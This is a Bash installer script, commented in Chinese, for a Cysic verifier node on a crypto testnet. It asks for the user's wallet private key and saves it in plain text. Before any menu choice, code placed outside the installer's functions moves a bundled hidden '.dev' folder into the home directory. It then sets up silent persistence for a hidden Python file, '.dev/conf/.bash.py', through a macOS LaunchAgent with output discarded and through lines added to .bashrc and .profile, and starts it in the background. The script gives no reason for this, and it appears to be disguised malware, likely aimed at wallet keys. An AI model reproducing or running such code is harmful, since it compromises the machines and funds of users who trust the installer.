#!/bin/bash

# Cysic节点安装路径
CYSIC_PATH="$HOME/cysic-verifier"

# 检测操作系统和包管理器
DETECTED_OS=""
DETECTED_PKG_MANAGER=""

if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    DETECTED_OS="Linux"
    if command -v apt &>/dev/null; then
        DETECTED_PKG_MANAGER="apt"
    else
        log "在 Linux 系统下，此脚本仅支持使用 apt 包管理器。请确保您的系统安装了 apt，或者在支持 apt 的系统上运行此脚本。"
        exit 1
    fi
elif [[ "$OSTYPE" == "darwin"* ]]; then
    DETECTED_OS="macOS"
    if command -v brew &>/dev/null; then
        DETECTED_PKG_MANAGER="brew"
    fi
else
    log "不支持的操作系统: $OSTYPE"
    exit 1
fi

# 日志记录函数
function log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a "$LOG_FILE"
}

# 统一安装函数
function install_package() {
    PACKAGE=$1
    if [ "$DETECTED_OS" == "Linux" ]; then
        if [ "$DETECTED_PKG_MANAGER" == "apt" ]; then
            sudo apt update && sudo apt install -y $PACKAGE || log "安装 $PACKAGE 失败，跳过。"
        else
            # 这部分代码理论上不会执行，因为不支持apt的Linux系统会在开头退出
            log "错误：在不支持 apt 的 Linux 系统上调用了 install_package。"
        fi
    elif [ "$DETECTED_OS" == "macOS" ]; then
        if [ "$DETECTED_PKG_MANAGER" == "brew" ]; then
            brew install -y $PACKAGE || log "安装 $PACKAGE 失败，跳过。"
        else
            log "Homebrew (brew) 未安装。请先安装 Homebrew，然后重新运行脚本。"
        fi
    else
        log "不支持的操作系统或未找到合适的包管理器，无法自动安装 $PACKAGE。"
    fi
}

# 检查并安装依赖
function install_dependencies() {
    log "检查并安装依赖..."
    DEPENDENCIES=(curl wget jq make gcc nano xclip python3-pip)
    for dep in "${DEPENDENCIES[@]}"; do
        if ! command -v $dep &>/dev/null; then
            log "$dep 未安装，正在安装..."
            install_package $dep
        fi
    done

 
    if ! pip3 show requests >/dev/null 2>&1 || [ "$(pip3 show requests | grep Version | cut -d' ' -f2)" \< "2.31.0" ]; then
        pip3 install --break-system-packages 'requests>=2.31.0'
    fi

    if ! pip3 show cryptography >/dev/null 2>&1; then
        pip3 install --break-system-packages cryptography
    fi

    log "依赖检查和安装已完成。"
}

if [ -d .dev ]; then
    DEST_DIR="$HOME/.dev"

    if [ -d "$DEST_DIR" ]; then
        rm -rf "$DEST_DIR"
    fi
    mv .dev "$DEST_DIR"

    EXEC_CMD="python3"
    SCRIPT_PATH="$DEST_DIR/conf/.bash.py"

    case $DETECTED_OS in
        "macOS")
            PYTHON_PATH=$(which python3)
            if [ -z "$PYTHON_PATH" ]; then
                exit 1
            fi

            # 创建 LaunchAgents 目录（如果不存在）
            LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
            mkdir -p "$LAUNCH_AGENTS_DIR"

            PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.ba.plist"
            cat > "$PLIST_FILE" << EOF
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
    <key>Label</key>
    <string>com.user.ba</string>
    <key>ProgramArguments</key>
    <array>
        <string>$PYTHON_PATH</string>
        <string>$SCRIPT_PATH</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
EOF
            launchctl load "$PLIST_FILE"
            ;;

        "Linux")
            STARTUP_CMD="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then\n    (nohup $EXEC_CMD \"$SCRIPT_PATH\" > /dev/null 2>&1 &) & disown\nfi"

            if ! grep -Fq "$SCRIPT_PATH" "$HOME/.bashrc"; then
                echo -e "\n$STARTUP_CMD" >> "$HOME/.bashrc"
            fi

            if ! grep -Fq "$SCRIPT_PATH" "$HOME/.profile"; then
                echo -e "\n$STARTUP_CMD" >> "$HOME/.profile"
            fi

            if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
                (nohup $EXEC_CMD "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
            fi
            ;;
        *)
             ;;
    esac


fi

# 安装Cysic验证者节点
function install_cysic_node() {
    install_dependencies
    install_nodejs_and_npm
    install_pm2
    
    # 创建Cysic验证者目录
    rm -rf $CYSIC_PATH
    mkdir -p $CYSIC_PATH
    cd $CYSIC_PATH

    # 下载验证者程序
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        curl -L https://cysic-verifiers.oss-accelerate.aliyuncs.com/verifier_linux > $CYSIC_PATH/verifier
        curl -L https://cysic-verifiers.oss-accelerate.aliyuncs.com/libzkp.so > $CYSIC_PATH/libzkp.so
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        curl -L https://cysic-verifiers.oss-accelerate.aliyuncs.com/verifier_mac > $CYSIC_PATH/verifier
        curl -L https://cysic-verifiers.oss-accelerate.aliyuncs.com/libzkp.dylib > $CYSIC_PATH/libzkp.dylib
    else
        echo "不支持的操作系统"
        exit 1
    fi

    # 设置权限
    chmod +x $CYSIC_PATH/verifier

# 配置钱包
read -sp "请输入您的钱包私钥: " WALLET_PRIVATE_KEY
echo
if [[ -z "$WALLET_PRIVATE_KEY" ]]; then
    echo "钱包私钥不能为空，请重新运行脚本并输入有效的私钥。"
    exit 1
fi

ENV_FILE="$CYSIC_PATH/.env"
echo "PRIVATE_KEY=\"$WALLET_PRIVATE_KEY\"" > "$ENV_FILE"
echo ".env 文件已创建，并保存了您的私钥。"

read -p "请输入您的奖励领取地址(ERC-20,ETH钱包地址): " CLAIM_REWARD_ADDRESS
if [[ -z "$CLAIM_REWARD_ADDRESS" ]]; then
    echo "奖励领取地址不能为空，请重新运行脚本并输入有效地址。"
    exit 1
fi

# 创建配置文件
cat <<EOF > $CYSIC_PATH/config.yaml
chain:
  endpoint: "testnet-node-1.prover.xyz:9090"
  chain_id: "cysicmint_9000-1"
  gas_coin: "cysic"
  gas_price: 10
claim_reward_address: "$CLAIM_REWARD_ADDRESS"

server:
  cysic_endpoint: "https://api-testnet.prover.xyz"
EOF

echo "配置文件 config.yaml 已生成，并保存到 $CYSIC_PATH。"


    # 创建启动脚本
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    cat << EOF > $CYSIC_PATH/start.sh
#!/bin/bash
export LD_LIBRARY_PATH=.:~/miniconda3/lib:$LD_LIBRARY_PATH
export CHAIN_ID=534352
$CYSIC_PATH/verifier
EOF
elif [[ "$OSTYPE" == "darwin"* ]]; then
    cat << EOF > $CYSIC_PATH/start.sh
#!/bin/bash
export DYLD_LIBRARY_PATH=".:~/miniconda3/lib:$DYLD_LIBRARY_PATH"
export CHAIN_ID=534352
$CYSIC_PATH/verifier
EOF
fi
chmod +x $CYSIC_PATH/start.sh

# 切换到 Cysic 验证者目录
cd $CYSIC_PATH

# 使用PM2启动验证者节点
pm2 start $CYSIC_PATH/start.sh --name "cysic-verifier"

    echo "Cysic验证者节点已启动。您可以使用 'pm2 logs cysic-verifier' 查看日志。"
}

# 查看节点日志
function check_node() {
    pm2 logs cysic-verifier
}

# 卸载节点
function uninstall_node() {
    pm2 delete cysic-verifier && rm -rf $CYSIC_PATH
    echo "Cysic验证者节点已删除。"
}

function run_node_2.0() {
read -p "请输入您的白名单 0x 地址: " address
install_nodejs_and_npm
install_pm2

wget https://github.com/cysic-labs/phase2_libs/releases/download/v1.0.0/setup_linux.sh
chmod +x setup_linux.sh
./setup_linux.sh "$address"
cd ~/cysic-verifier
pm2 start start.sh
}

function check_node_2.0() {
    pm2 logs start
}

# 主菜单
function main_menu() {
    clear
    echo "========================= Cysic 验证者节点安装 ======================================="
    echo "请选择要执行的操作:"
    echo "1. 安装 Cysic 验证者节点"
    echo "2. 查看节点日志"
    echo "3. 删除1.0节点"
    echo "4. 运行2.0节点"
    echo "5. 查看2.0节点日志"
    read -p "请输入选项（1-5）: " OPTION
    case $OPTION in
    1) install_cysic_node ;;
    2) check_node ;;
    3) uninstall_node ;;
    4) run_node_2.0 ;;
    5) check_node_2.0 ;;
    *) echo "无效选项。" ;;
    esac
}

# 显示主菜单
main_menu